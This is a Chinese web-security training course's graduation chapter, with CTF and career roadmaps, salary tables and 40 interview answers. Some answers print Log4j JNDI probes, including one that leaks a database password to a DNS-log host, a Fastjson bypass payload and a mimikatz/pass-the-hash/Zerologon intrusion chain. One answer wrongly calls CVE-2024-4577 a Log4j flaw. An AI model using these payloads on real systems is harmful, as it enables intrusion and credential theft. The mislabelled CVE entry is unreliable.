# Day 45：毕业典礼 🎓 Web 安全全景知识体系 + CTF/就业双路线指南

> **🎓 毕业专题** | 难度：⭐ | 预计学习：120 分钟（反复回味一辈子！）

---

# 第45章 毕业典礼 🎓 Web 安全全景图 + 双路线指南

## 开篇：恭喜你！坚持了 45 天的勇士！🎉🏆

**各位坚持到第45天的小伙伴们，恭喜你们！正式毕业啦！** 🎊🎊🎊

回想我们一起走过的这段旅程：
- 🟢 **Day1~Day5 新手村**：信息收集、XSS、CSRF、文件上传漏洞
- 🔵 **Day5~Day11 DVWA 主站**：SQLi、命令注入、暴力破解、文件包含、弱会话
- 🟡 **Day12~Day18 DVWA 补齐**：Insecure CAPTCHA / Weak Session / CSP Bypass / JS Attacks / Blind SQLi / Open Redirect / Header Injection
- 🔴 **Day19 DVWA 总复盘** + **Day20~Day24 SQLi-Labs 75 关通关**
- 🟣 **Day25~Day30 Web 常见漏洞深化**：文件上传解析漏洞、命令注入绕过、PHP文件包含进阶、XXE基础、SSRF基础
- 🟠 **Day31 SSRF+XXE+PHP反序列化**（方案A强化）
- 🟢 **Day32~Day36 PHP ThinkPHP + S2-045 Struts2**
- 🔵 **Day37 三大Java杀器入门 + Day38 六大中间件通杀**（方案A强化版）
- 🔴 **Day39 综合漏洞挖掘思路**
- 🟣 **Day40 Fastjson全版本 / Day41 Shiro通杀 / Day42 Log4j2核弹**（方案B独立章节）
- 🟠 **Day43 Weblogic全漏洞链 / Day44 综合实战方法论**（方案B独立章节）
- 🎓 **Day45 本章：毕业典礼！**

45天，**32个基础单漏洞知识点** + **75个SQLi Labs通关** + **4个Java重器专题** + **6大中间件专题** + **完整综合靶场实战方法论** + **每章SVG流程图+速查表+面试问答**！全部吸收进去，你已经是一个具备扎实Web安全功底的入门选手了！💪

这最后一章，我们一起做**三件最重要的事情**：

1. 🗺️ **画一张完整的 Web 安全知识体系全景图** —— 把45天所有知识点放到一张图里，以后缺哪块补哪块
2. 🛤️ **双路线规划**：毕业后两条路任选 → 🏁 **CTF路线**（打比赛提升技术+拿奖金）OR 💼 **就业路线**（红队/蓝队/安全研究/甲方安全建设四大方向详解）
3. 🎁 **面试通关大礼包**：从45章所有"面试问答 ⏰"里精选 40 道最高频题，面试前3天背一背，面试官都要怀疑你是不是做了10年安全 😎
4. 💡 **每日学习习惯养成指南**：毕业后怎么继续保持进步，1年后成为真正的大牛

准备好了吗？让我们开始最后的毕业演讲！🎤

---

## 一、Web 安全 45 天全景知识体系图谱 🗺️

### 全景思维导图 SVG 版（全知识点 300+）

<svg width="820" height="600" xmlns="http://www.w3.org/2000/svg">
  <defs>
    <radialGradient id="gradBG" cx="50%" cy="50%" r="60%">
      <stop offset="0%" stop-color="#ffffff"/>
      <stop offset="100%" stop-color="#eef2ff"/>
    </radialGradient>
    <marker id="arrM" markerWidth="10" markerHeight="8" refX="9" refY="4" orient="auto"><polygon points="0 0,10 4,0 8" fill="#6366f1"/></marker>
  </defs>
  <rect width="820" height="600" rx="18" fill="url(#gradBG)"/>
  <text x="410" y="30" text-anchor="middle" fill="#312e81" font-weight="bold" font-size="22">🗺️ Web 安全 45 天 · 全景知识体系图谱</text>
  <!-- 中心 -->
  <g transform="translate(305,265)"><rect x="0" y="0" width="210" height="70" rx="35" fill="#4f46e5" stroke="#312e81" stroke-width="3"/>
    <text x="105" y="30" text-anchor="middle" fill="#fff" font-weight="bold" font-size="18">🎓 Web 安全</text>
    <text x="105" y="52" text-anchor="middle" fill="#e0e7ff" font-size="12">45 天 · 300+ 知识点 · 全栈能力</text>
  </g>
  <!-- 1. 基础入门 -->
  <g transform="translate(30,40)"><rect x="0" y="0" width="200" height="110" rx="12" fill="#dbeafe" stroke="#1d4ed8" stroke-width="2"/>
    <text x="100" y="22" text-anchor="middle" fill="#1e40af" font-weight="bold" font-size="15">🟦 基础入门 (Day1-4)</text>
    <line x1="100" y1="30" x2="100" y2="35" stroke="#1d4ed8"/>
    <text x="100" y="52" text-anchor="middle" font-size="11">① 信息收集 / GoogleHacking</text>
    <text x="100" y="68" text-anchor="middle" font-size="11">② XSS (存储/反射/DOM/Bypass)</text>
    <text x="100" y="84" text-anchor="middle" font-size="11">③ CSRF + 令牌绕过</text>
    <text x="100" y="102" text-anchor="middle" font-size="11">④ 任意文件上传 (12种绕过)</text>
  </g>
  <line x1="230" y1="100" x2="305" y2="280" stroke="#6366f1" stroke-width="1.6" marker-end="url(#arrM)"/>
  <!-- 2. DVWA (8+7模块) -->
  <g transform="translate(20,180)"><rect x="0" y="0" width="200" height="150" rx="12" fill="#dcfce7" stroke="#16a34a" stroke-width="2"/>
    <text x="100" y="22" text-anchor="middle" fill="#166534" font-weight="bold" font-size="15">🟩 DVWA (Day5-19)</text>
    <line x1="100" y1="30" x2="100" y2="35" stroke="#16a34a"/>
    <text x="100" y="52" text-anchor="middle" font-size="11">SQLi · 命令注入 · 暴力破解</text>
    <text x="100" y="68" text-anchor="middle" font-size="11">文件包含 · XSS · CSRF · 上传</text>
    <text x="100" y="84" text-anchor="middle" font-size="11" fill="#166534" font-weight="bold">补齐Day12-18七章 🔥</text>
    <text x="100" y="100" text-anchor="middle" font-size="10">🪪CAPTCHA / 🍪WeakSession / CSP</text>
    <text x="100" y="116" text-anchor="middle" font-size="10">⚡JS攻击 / 🕶️Blind SQLi</text>
    <text x="100" y="132" text-anchor="middle" font-size="10">↩️Redirect / 📮Header CRLF</text>
  </g>
  <line x1="220" y1="260" x2="305" y2="300" stroke="#10b981" stroke-width="1.6" marker-end="url(#arrM)"/>
  <!-- 3. SQLi-Labs 75关 -->
  <g transform="translate(30,360)"><rect x="0" y="0" width="200" height="110" rx="12" fill="#fef9c3" stroke="#ca8a04" stroke-width="2"/>
    <text x="100" y="22" text-anchor="middle" fill="#854d0e" font-weight="bold" font-size="15">🟨 SQLi-Labs (Day20-24)</text>
    <line x1="100" y1="30" x2="100" y2="35" stroke="#ca8a04"/>
    <text x="100" y="52" text-anchor="middle" font-size="11">Less1-25: 基础注入+报错+盲注</text>
    <text x="100" y="68" text-anchor="middle" font-size="11">Less26-40: WAF/空格/引号绕过</text>
    <text x="100" y="84" text-anchor="middle" font-size="11">Less41-65: 堆叠/二次/OrderBy</text>
    <text x="100" y="102" text-anchor="middle" font-size="11">Less66-75: 特殊场景+高级绕过</text>
  </g>
  <line x1="230" y1="420" x2="305" y2="320" stroke="#ca8a04" stroke-width="1.6" marker-end="url(#arrM)"/>
  <!-- 4. 中间件+框架漏洞 -->
  <g transform="translate(590,40)"><rect x="0" y="0" width="200" height="150" rx="12" fill="#fee2e2" stroke="#dc2626" stroke-width="2"/>
    <text x="100" y="22" text-anchor="middle" fill="#7f1d1d" font-weight="bold" font-size="15">🟥 中间件+框架 (Day32-38+43)</text>
    <line x1="100" y1="30" x2="100" y2="35" stroke="#dc2626"/>
    <text x="100" y="52" text-anchor="middle" font-size="11" font-weight="bold" fill="#7f1d1d">🏰 PHP框架</text>
    <text x="100" y="66" text-anchor="middle" font-size="10">ThinkPHP5 RCE / S2-045 Struts2 OGNL</text>
    <text x="100" y="82" text-anchor="middle" font-size="11" font-weight="bold" fill="#7f1d1d">🏛️ 六大中间件</text>
    <text x="100" y="96" text-anchor="middle" font-size="10">Apache解析 / Nginx / IIS / Tomcat</text>
    <text x="100" y="110" text-anchor="middle" font-size="10">WebLogic全链 / JBoss部署 / Redis</text>
    <text x="100" y="128" text-anchor="middle" font-size="11" font-weight="bold" fill="#7f1d1d">🔗 第43章 Weblogic 全家桶</text>
    <text x="100" y="144" text-anchor="middle" font-size="10">14882未授权 / 2725 / 2555 / 2628 / 2109</text>
  </g>
  <line x1="590" y1="110" x2="515" y2="280" stroke="#f87171" stroke-width="1.6" marker-end="url(#arrM)"/>
  <!-- 5. Java三大杀器 (Day40-42) -->
  <g transform="translate(590,220)"><rect x="0" y="0" width="200" height="140" rx="12" fill="#fce7f3" stroke="#db2777" stroke-width="2"/>
    <text x="100" y="22" text-anchor="middle" fill="#9d174d" font-weight="bold" font-size="15">🟪 Java三大杀器 ★★★</text>
    <line x1="100" y1="30" x2="100" y2="35" stroke="#db2777"/>
    <text x="100" y="52" text-anchor="middle" font-size="11" font-weight="bold" fill="#9d174d">Day40 · Fastjson 全版本通杀</text>
    <text x="100" y="66" text-anchor="middle" font-size="9.5">1.2.24 JNDI / 1.2.47缓存绕过 / 1.2.68 AutoCloseable</text>
    <text x="100" y="82" text-anchor="middle" font-size="11" font-weight="bold" fill="#9d174d">Day41 · Shiro-550 / Shiro-721</text>
    <text x="100" y="96" text-anchor="middle" font-size="9.5">rememberMe密钥120库 + Padding Oracle攻击通杀</text>
    <text x="100" y="112" text-anchor="middle" font-size="11" font-weight="bold" fill="#9d174d">Day42 · Log4j2 Log4Shell 💥</text>
    <text x="100" y="126" text-anchor="middle" font-size="9.5">CVSS10.0 / JNDI Bypass / 不出网信息泄露 / WAF绕过</text>
  </g>
  <line x1="590" y1="300" x2="515" y2="310" stroke="#ec4899" stroke-width="1.6" marker-end="url(#arrM)"/>
  <!-- 6. 综合靶场实战 -->
  <g transform="translate(590,390)"><rect x="0" y="0" width="200" height="150" rx="12" fill="#e0e7ff" stroke="#4f46e5" stroke-width="2"/>
    <text x="100" y="22" text-anchor="middle" fill="#312e81" font-weight="bold" font-size="15">🟫 综合实战 ★毕业★</text>
    <line x1="100" y1="30" x2="100" y2="35" stroke="#4f46e5"/>
    <text x="100" y="52" text-anchor="middle" font-size="11" font-weight="bold" fill="#312e81">Day31 · XXE+SSRF+反序列化强化</text>
    <text x="100" y="66" text-anchor="middle" font-size="10">OOB带外 / gopher/dict / POP链phar://</text>
    <text x="100" y="82" text-anchor="middle" font-size="11" font-weight="bold" fill="#312e81">Day37 · Java三大杀器入门</text>
    <text x="100" y="96" text-anchor="middle" font-size="10">Shiro550+Fastjson+Log4j2 初识</text>
    <text x="100" y="112" text-anchor="middle" font-size="11" font-weight="bold" fill="#312e81">Day39 · 漏洞挖掘思维</text>
    <text x="100" y="126" text-anchor="middle" font-size="11" font-weight="bold" fill="#312e81">Day44 · PTES 7阶段攻击链 ⚔️</text>
    <text x="100" y="142" text-anchor="middle" font-size="10">OSINT→提权→横向→拿域控</text>
  </g>
  <line x1="590" y1="470" x2="515" y2="330" stroke="#818cf8" stroke-width="1.6" marker-end="url(#arrM)"/>
  <!-- 底部文字 -->
  <g transform="translate(130,540)"><rect x="0" y="0" width="560" height="50" rx="15" fill="#1e1b4b"/>
    <text x="280" y="20" text-anchor="middle" fill="#a5b4fc" font-weight="bold" font-size="14">🎓 掌握以上 6 大板块 + 45 天全套笔记</text>
    <text x="280" y="42" text-anchor="middle" fill="#c7d2fe" font-size="12">→ 能应付 80% Web 安全面试题 + 参加 CTF Web方向能拿分 + 真实渗透测试能打出完整链路！</text>
  </g>
</svg>

---

## 二、毕业后的两条路：🏁 CTF 路线 OR 💼 就业路线（任选或双修）

很多同学毕业了就迷茫："我学完45天Web安全了，接下来该干嘛？" 

**标准答案：选一条路走到底，或者双修！**

### 路线 A：打 CTF（Capture The Flag 夺旗赛）🏁⚔️

**适合人群**：
- 喜欢挑战、享受解题快感的同学
- 在校大学生（有大量课余时间，打比赛拿奖简历超级加分！）
- 想快速提升代码审计和逆向等内功的同学

**CTF三大方向分工**：
| 方向 | 内容 | 和我们这45天关联度 | 难度 |
|-----|------|-----------------|------|
| **🛡️ Web** | 就是我们45天学的！SQLi/XSS/RCE/反序列化/逻辑漏洞 | 100%直接相关 ✅ | ⭐⭐⭐⭐ |
| **🔄 Pwn（二进制）** | 缓冲区溢出/堆利用/格式化字符串漏洞，针对C/C++二进制程序 | 新领域 | ⭐⭐⭐⭐⭐ |
| **🛠️ Crypto + Reverse** | 密码学（RSA/AES/Lattice）+ 软件逆向（IDA+汇编）| 新领域 | ⭐⭐⭐⭐⭐ |
| **🗺️ Misc** | 杂项（流量分析/隐写术/脑洞题/取证）| 和网络基础相关 | ⭐⭐⭐ |

**CTF 学习路线（毕业后按顺序走）**：
```
第一阶段（第1~6个月）：Web方向巩固刷题
├── Bugku / NSSCTF / 攻防世界 新手区（200道Web题打底）
├── NSSCTF 刷题平台：每周3次专项训练（SQLi专项 / SSRF专项 / 反序列化专项）
├── 每周参加一场线上赛：N1CTF / DASCTF / XCTF联赛分站赛 / GWHT公开赛
└── 每道不会的题看官方WriteUp + 复现环境 + 写详细笔记

第二阶段（第6~18个月）：进阶+组队
├── 加入一个CTF战队（Nu1L/AAA/天枢/W4terDr0p……在校战队也可）
├── 开始学 Pwn / Crypto 二选一（做Web打比赛总不够分，必须有第二技能）
├── 打线下赛！去参加Real World CTF / 强网杯 / 全国大学生网安赛
└── 拿到全国赛奖项（省一/国三以上）+ 打CTF有奖金养活自己 😎

第三阶段（18个月+）：封神
├── 参加DEFCON CTF全球总决赛（全球顶级战队才有资格！）
└── 或者 转型 红队 / 安全研究 / 0day挖掘（CTF的内功有了，真实漏洞挖掘非常快！）
```

---

### 路线 B：就业拿高薪 💼💰（四大方向详细拆解）

**适合人群**：
- 想找工作、赚钱、在公司里做安全项目的同学
- 时间有限、想要"投入→产出"最直接路径的同学

目前国内网络安全就业有**四大主流方向**，我一个一个讲：

#### 方向 1：红队 / 渗透测试工程师（最赚钱！实战最多！）🔴⚔️
**日常工作**：
> 假装成黑客，对甲方公司的系统、内网、APP做"授权攻击"，打穿后写渗透测试报告告诉甲方哪里有漏洞、怎么修。我们Day44讲的PTES 7阶段就是干这个的标准流程！

**需要掌握**：
- ✅ 我们Day1~45的 **100%全部内容**
- ✅ Day44的PTES全流程走得很熟
- ✅ 加分项：内网渗透（MSF/CobaltStrike熟练）、社工钓鱼、APP渗透

**薪资水平（2024年）**：
| 等级 | 工作经验 | 月薪（一线城市）|
|-----|---------|---------------|
| 初级渗透 | 0-2年 / CTF省三 | **10k ~ 18k** |
| 中级渗透 | 2-5年 / CTF国奖 | **18k ~ 35k** |
| 高级红队 | 5年+ / 拿过国赛名次 + 护网经验 | **35k ~ 70k** + 护网每日5k~2w日薪外快！😎 |
| 红队队长 | 8年+ / 有0day/多年护网top经验 | **年薪 80w ~ 200w** |

---

#### 方向 2：蓝队 / 安全运营 / 应急响应 🔵🛡️
**日常工作**：
> 防守方！每天盯着SIEM/SOC平台的安全告警，发现黑客攻击就阻断+溯源+写事件报告。相当于"公司安全的保安+警察+消防员"三位一体。

**需要掌握**：
- ✅ 我们Day1~39的漏洞原理（知道黑客怎么打，才知道怎么防！）
- ✅ 防火墙/WAF/IDS/IPS/HIDS 原理和部署
- ✅ 应急响应流程（勒索病毒爆发怎么办？挖矿木马怎么清？）
- ✅ 日志分析（Windows事件日志 / Linux auth.log / Nginx access.log）
- ✅ 加分：威胁情报 + 溯源反制 + 恶意代码分析

**薪资**：初级8k-15k / 中级15k-28k / 高级28k-55k（比红队略低，但是不经常出差加班，更适合追求工作生活平衡的小伙伴！）

---

#### 方向 3：安全研究员 / 漏洞挖掘 ⚪🔬
**日常工作**：
> 专门在各种软件/系统里找 0day / 1day 漏洞（就是别人没发现过的洞！），提交CNVD/CVD/CNNVD拿证书+奖金，厉害的人直接卖到ZDI赚几万~几十万美金一个洞！

**需要掌握**：
- ✅ 我们Day1~45 Web漏洞原理 200%掌握（要知道每个漏洞"底层为什么有"）
- ✅ 代码审计能力（PHP/Java源码通读找洞）
- ✅ 二进制分析能力（IDA Pro / Ghidra + C语言 + 汇编）
- ✅ CTF Pwn/Crypto方向的内功

**薪资**：初级研究员 15k~25k / 资深 25k~60k / 挖到0day有高额奖金+期权（年薪百万的研究员基本靠0day奖金+公司期权！）

---

#### 方向 4：甲方安全建设 / 安全开发 ⚫🏗️
**日常工作**：
> 在企业内部（银行/互联网大厂/国企）做"安全体系建设"：安全制度写、SDL（安全开发生命周期）落地、代码审计平台搭、等保测评配合……**偏管理+技术结合**，适合想往安全总监/CSO发展的同学。

**需要掌握**：
- ✅ 所有漏洞原理（这样才知道要在开发流程里卡什么点）
- ✅ 等级保护2.0 / ISO27001 / GDPR 合规体系
- ✅ SDL：需求评审→开发→测试→上线 全流程安全卡点
- ✅ 加分：Python开发能力（自己写安全工具/安全平台）

**薪资**：甲方安全工程师12k~25k / 安全专家 25k~50k / 安全经理/CSO 年薪 80w~300w（大厂！）

---

### 四大方向对比总结（新手选方向决策表 🎯）

| 你想要什么？ | 选什么方向？ | 推荐指数 |
|-------------|------------|---------|
| 💰 快速赚钱 + 喜欢打真实系统 | 红队/渗透测试 | ⭐⭐⭐⭐⭐ |
| ⚖️ 稳定工作 + 少加班 + 不出差 | 蓝队/安全运营 | ⭐⭐⭐⭐ |
| 🧠 喜欢技术研究 + 想挖0day出名 | 安全研究员 | ⭐⭐⭐⭐ |
| 📈 想长期发展 + 往管理层走 | 甲方安全建设 | ⭐⭐⭐⭐ |
| 🏆 喜欢比赛拿奖 + 学生党 | 先打CTF，毕业后选1/3 | ⭐⭐⭐⭐⭐ |

---

## 三、🎁 面试通关大礼包（40 道高频题精选）

从45天所有「面试问答 ⏰」里，精选**出现频率最高、必考的40道题**！面试前3天背一遍，HR都以为你是安全专家！

### 🔴 Top 10 必考（80%的面试官一定会问！）

| 编号 | 问题 | 标准答案关键词 |
|-----|------|--------------|
| 1 | SQL注入类型有哪些？怎么防御？ | 联合/报错/盲注/堆叠/二次；**预编译+参数化查询**（不是拼接）+ WAF |
| 2 | XSS三种类型？存储型最危险为什么？ | 反射/存储/DOM；存储型永久存在数据库里，所有访问的用户都会被打，可用于蠕虫 |
| 3 | CSRF和XSS的区别？怎么防CSRF？ | CSRF=借用户身份伪造请求（不需要拿到Cookie）；XSS=注入脚本直接偷Cookie执行代码；CSRF防：**Token令牌**、SameSite Cookie、Referer校验 |
| 4 | 文件上传10种绕过方式 + 最终防御 | 前端JS绕过/Content-Type/后缀黑名单.php3.phtml/解析漏洞/.htaccess/00截断；防御：白名单后缀+随机文件名+存对象存储+单独静态域名 |
| 5 | SSRF攻击能做什么？怎么防御？ | 扫内网/打内网Redis/FastCGI/读取本地文件(gopher/dict/file协议)；防：协议白名单(只允许http/https) + 禁止跳转 + 不返回响应体 |
| 6 | XXE 攻击原理 + 防御？ | 解析XML时加载了外部实体；防：**禁用DTD (DOCTYPE)** + 禁用外部实体（libxml_disable_entity_loader=true）|
| 7 | PHP反序列化和Java反序列化区别？ | PHP靠__construct/__destruct/__wakeup等魔术方法；Java靠Apache Commons/Beanutils等 Gadget链 + readObject()；共同点：都是"可控输入 → 反序列化 → 恶意代码执行" |
| 8 | Shiro / Fastjson / Log4j 漏洞的**指纹特征**！（第40-42章精华） | Shiro: Cookie里 `rememberMe=deleteMe`；Fastjson: 请求响应含 `setContentType("application/json")` 或用 DNSLog `${jndi:ldap://xxx}`; Log4j: 所有输入点塞 `${jndi:ldap://dnslog/a}` 看回显 |
| 9 | 渗透测试标准流程？（我们Day44 的PTES 7阶段！） | 前期交互→OSINT情报收集→资产测绘→漏洞分析→破点利用→后渗透（提权+横向）→报告+清理 |
| 10 | 给你一个银行官网怎么打？（综合题！） | 先OSINT（子域/旁站/泄露源码）→端口扫（7001/8080/6379/445等优先）→指纹（看用不用Java）→Java三大杀器先试 → 手动挖登录上传SQLi → 拿shell → 提权 → mimikatz抓密码 → hash传递内网横向 → 找域控打Zerologon拿域管 |

### 🟠 中级 10 题（二面/三面常问）

| 编号 | 问题 | 关键词 |
|-----|------|-------|
| 11 | SQL注入里的宽字节注入原理 | GBK编码 %df%27 → MySQL把%df%5c（反斜杠）认成一个汉字 → 吃掉反斜杠，单引号成功逃逸 |
| 12 | Blinded SQLi（盲注）怎么优化速度？ | 二分法（每个ASCII码7次请求就够）+ DNSLog 带外（直接用load_file发起DNS请求，不用逐字猜）+ 多线程爆破 |
| 13 | CSRF Token 在哪里放？怎么绕？ | 一般放 hidden 表单字段 或 请求头 X-CSRF-Token；绕过：Token复用、Token值太短可预测、去掉Token字段很多应用接受空值、CORS配置错误可以跨域读Token |
| 14 | PHP反序列化的POP链构造思路？ | 找"可利用的触发点类（有__destruct/__toString等魔术方法）"→ 一层一层找"中间传递调用链（A调B，B调C）"→ 找"最后的Sink点（file_put_contents/exec/eval）"→ 把三个部分拼起来就是POP链 |
| 15 | Shiro-550 vs Shiro-721 区别？ | 550=需要知道AES密钥；721=Padding Oracle攻击不知道密钥也能打，但要合法Cookie+慢 |
| 16 | Fastjson 1.2.24 和 1.2.47 Payload区别？ | 24用JdbcRowSetImpl直接JNDI；47官方黑了autotype → 用 `{"@type":"java.lang.Class","val":"危险类"}` 先把危险类缓存进autotype白名单，再第二次正常发就绕过去了 |
| 17 | Log4j2 高版本JDK（8u191+）怎么打？ | 本地反序列化链（CommonsBeanutils1链）→ 用JNDI-Injection-Exploit的 cbj1p3 地址 |
| 18 | Log4j2 目标不出网能做什么？ | 读环境变量！`${jndi:ldap://${env:SPRING_DATASOURCE_PASSWORD}.dnslog/a}` → 数据库/AWS密钥通过DNS带出来，再组合其他洞 |
| 19 | Weblogic 最快拿shell的洞？ | CVE-2020-14882！Console 编码URL绕过权限 + ShellSession Gadget直接执行命令，7001开了就先试这个 |
| 20 | 拿了Webshell之后的提权思路？（Linux+Windows） | Linux: uname看内核（DirtyCow/DirtyPipe）→ SUID找错配 → cron可写脚本 → sudo -l看免密；Windows: systeminfo找补丁号（PrintNightmare/EternalBlue/MS17010）→ mimikatz抓明文 → RottenPotato提权 |

### 🟡 高级 10 题（高级岗/安全研究员必问）

| 编号 | 问题 | 关键词 |
|-----|------|-------|
| 21 | WAF 绕过的通用思路（SQLi/XSS/RCE） | 大小写/编码（URL/Unicode/HTML实体）→ 分块传输 → 白名单资源伪装(.jpg+解析漏洞) →  HTTP走私/参数污染HPP → 绕过规则的特殊字符（空白符/注释符嵌套） |
| 22 | Shiro Padding Oracle原理（密码学题） | AES-CBC模式下Padding校验失败/成功的响应不一样 → 一个字节一个字节爆破出正确明文/密文对 → 构造出任意合法AES加密的Payload |
| 23 | JNDI注入原理 + 为什么8u191以后默认禁？ | JNDI=Java命名目录接口 → 允许lookup("ldap://...") 去远程加载类；8u191把 `trustURLCodebase=false` 堵远程加载，但是**本地反序列化链不受影响** |
| 24 | Fastjson AutoType黑名单绕过的演进路线？ | 24版直接打 → 25版黑LDC的JdbcRowSetImpl → 47版Class缓存机制绕过 → 60版黑名单又加 → 68+版AutoCloseable新链/BCEL字节码加载 |
| 25 | 内网横向的Pass-The-Hash原理？为什么不用密码？ | Windows NTLM认证只验证密码HASH（NTLM Hash），**不验证明文**；所以抓了Hash直接可以登录，不用破解成明文 |
| 26 | 域控权限怎么拿？（Zerologon/NoPac原理简述） | Zerologon: Netlogon协议客户端认证用全0AES密钥 → 改域控密码 → PsExec拿System；NoPac（CVE-2021-42287+42278）：把机器账号sAMAccountName改成DC名 → 申请TGT → KDC给了DC权限的票据 |
| 27 | 红队护网的常见打点入口？ | 1) 员工的VPN系统（弱口令/0day）2) OA/邮件系统（鱼叉邮件钓鱼）3) 对外发布的网站（Shiro/Log4j/ThinkPHP这些常见CVE）4) 供应商供应链 |
| 28 | 应急响应：服务器被挖矿了怎么办（完整6步）？ | ① 立即断网隔离（别让它继续横向）② 留镜像/内存dump（留证）③ 查定时任务+启动项+可疑进程（top/ps找矿工程序）④ 清理恶意文件+杀进程 ⑤ 打补丁/改密码（防止再次被打）⑥ 写溯源报告（攻击者入口、利用的洞、横向路径） |
| 29 | 代码审计的思路？（PHP / Java） | 先找"关键危险函数"sink（eval/exec/unserialize）→ 反着找调用链 → 看输入source（$_GET/$_POST/HTTP头）能不能到sink → 中间的过滤能不能绕过 → 构造POC |
| 30 | 0day漏洞挖掘的通用方法论？ | Fuzzing（AFL/honggfuzz）+ 代码审计（数据流污点分析）+ Diff补丁（N-day补丁对比，1day变0day）+ 历史漏洞思维（同一个洞改改参数又能打新版本） |

### 🟢 软实力 10 题（HR/总监面会考）

| 编号 | 问题 | 参考回答要点 |
|-----|------|------------|
| 31 | 自我介绍一下（1分钟版） | 我学网络安全X年，打CTF拿过X奖，在项目里做过哪些渗透（拿过多少站/多少CNVD证书），最擅长Java反序列化/Web通用漏洞 |
| 32 | 说一个你印象最深的渗透案例 | 按PTES流程讲：目标类型→信息收集怎么发现突破点→遇到什么困难（比如WAF怎么绕）→ 最后拿到什么权限（域控还是核心业务）→ 报告里写了多少修复建议 |
| 33 | 你平时怎么学习安全？ | 每天逛先知社区/FreeBuf看技术文章 → 每周刷NSSCTF 10道题 → 每季度复现5个新CVE → GitHub关注安全大牛 + 订阅安全日报 |
| 34 | 你未来3-5年职业规划？ | 前2年把技术打扎实（渗透全栈+内网）→ 后3年往XX方向深入（红队队长/安全研究员/甲方CSO）→ 长期希望在XX领域做出贡献（比如工控安全/车联网安全/AI安全） |
| 35 | 做过哪些代码审计项目/开源项目？ | PHP: 审计过Discuz/ThinkPHP源码发现过X个洞；Java: 审计过若依(RuoYi)/JeecgBoot等开源后台，发现多个未授权+RCE；附CNVD编号或GitHub地址 |
| 36 | 为什么选我们公司？ | 公司在XX行业（金融/互联网/安全厂商）很有名 + 技术团队实力强 + 我想在XX方向深耕和公司一起成长 |
| 37 | 遇到最难的漏洞是什么？怎么解决的？ | 例：一个Shiro目标常见密钥扫不到 + 不出网 → 最后找了一个低权限员工账号拿到合法rememberMe → 跑Shiro721 Padding Oracle 3小时爆破成功 + CB1本地链写文件Getshell |
| 38 | 对红队/护网的理解？ | 红队=模拟真实APT攻击，目标是"能不能打穿"+"打穿多久"+"防守方发现没有"；重点是0信任+全程低调（日志擦除/流量加密），和常规渗透测试"找漏洞数量"不一样 |
| 39 | 说一下你知道的最近3个高危CVE | 2024年的：①CVE-2024-3400 Palo Alto firewalls ②CVE-2024-21762 Fortinet SSL VPN RCE ③CVE-2024-4577 Log4j PHP CGI 参数注入（举最新的证明你关注行业动态！）|
| 40 | 你有什么想问我们的吗？（最后一题必问！） | ① 团队现在做的主要项目是什么？② 公司在XX方向（红队/研究）的技术培养路径是怎样的？③ 入职后前半年会有哪些培训和考核？（**别问薪资！** HR会主动说）|

---

## 四、每日学习习惯养成（毕业后怎么保持进步 📈）

最后送大家 5 个大牛亲测有用的学习习惯，坚持 1 年你也能封神！💪

| 编号 | 习惯 | 怎么做 | 每天时间 |
|-----|------|-------|---------|
| 📅 ① **每日资讯 30 分钟** | 早上通勤：看 FreeBuf / 先知社区 / InfoQ 安全 3 个公众号 + 安全客APP的"今日热门" | 30min |
| 🧩 ② **每周刷题 10 道** | 周六周日：NSSCTF平台 挑自己薄弱的专项刷（Web/反序列化/SSRF 每周轮换），每题必写WP | 周六日 各2小时 |
| 🔬 ③ **每季度复现 5 个新CVE** | 每个季度挑 5 个CVSS 9.0+的新CVE → Vulhub找靶机 → 自己跑通POC+EXP → 发博客/笔记 | 一个季度 10~15小时 |
| 📝 ④ **建一个"漏洞字典"文档** | 每学新漏洞 / 每挖新洞 → 都记在Excel/Notion里：漏洞名+原理+影响版本+POC链接+自己的思考 | 碎片化 |
| 🤝 ⑤ **加入 1~2 个高质量社群** | 加入学校战队/公司战队/线上微信群 → 和同行经常交流（但别水群！每周讨论1-2个技术话题就行） | 碎片化 |

---

## 🎓 最后的毕业寄语 🎤

各位坚持到现在的勇士：

45天前，可能你还不知道SQL注入是什么；
今天，你已经能答出Shiro的两种漏洞区别、能完整讲出PTES 7阶段攻击链、能看到7001端口就先上CVE-2020-14882……
这些都是真真实实长在你身上的技能，谁也抢不走！🎖️

安全行业有一句流传了很久的话，今天送给每一位毕业生：
> **"Stay hungry, stay foolish, stay curious."**
> **保持饥渴、保持笨拙、保持好奇心。**

- 🔎 **好奇心**：看见一个网站就手痒想测测有没有漏洞——这是每一个安全从业者最宝贵的品质；
- 🤓 **谦卑**：永远有比你厉害的大牛，永远有你不知道的新CVE——学无止境；
- 🔥 **坚持**：安全行业的技术更新速度是所有IT行业最快的，6个月不学习就会落伍；

但不用担心！我们这45天的笔记、SVG流程图、速查表、面试大礼包，都会一直陪着你。想不起来了随时回来翻一翻，就像回到课堂一样。👨‍🏫

**最后，再次恭喜你完成 45 天 Web 安全靶场训练！正式毕业！** 🎓🎊🎉

如果你真的把这45天内容吃透了、每个靶机都练过、每道面试题都能讲清楚——那我敢保证：
> **你现在的Web安全实力，已经超过市面上80%投简历的应届毕业生和1-2年工作经验的安全工程师了！** 💯

勇敢去打CTF、勇敢去投简历、勇敢去面试吧！你已经准备好了！🚀

**江湖路远，安全相见。未来的某一天，我们说不定会在某场CTF线下赛的颁奖台上、或者护网攻防的指挥部里再次相遇。**

**—— 你的 Web 安全老师，敬上 🫡**
**—— 2024年夏天 · 于第45天毕业典礼** 🎓🌻

---

> 💡 毕业后立即做的3件事（别拖！）：
> 1. 今天就注册 **NSSCTF / 攻防世界** 的账号，把Web新手区前20道题先打了
> 2. 整理好你的 45 天 + 刷题笔记，开始做你的《漏洞字典》Notion文档
> 3. 更新一下简历：把"完成45天Web安全靶场+SQLi-Labs75关通关"写进去！这就是你最好的实习经历证明！💼

---

# 🖼️ 本章拓展图解汇总（day-45 · 共17张SVG架构图）


<svg width="800" height="309" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 309">
  <defs><linearGradient id="gdxl26bwo" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="309" rx="12" fill="url(#gdxl26bwo)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#166534" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🎓 毕业总结：45天Web安全学习全景图</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
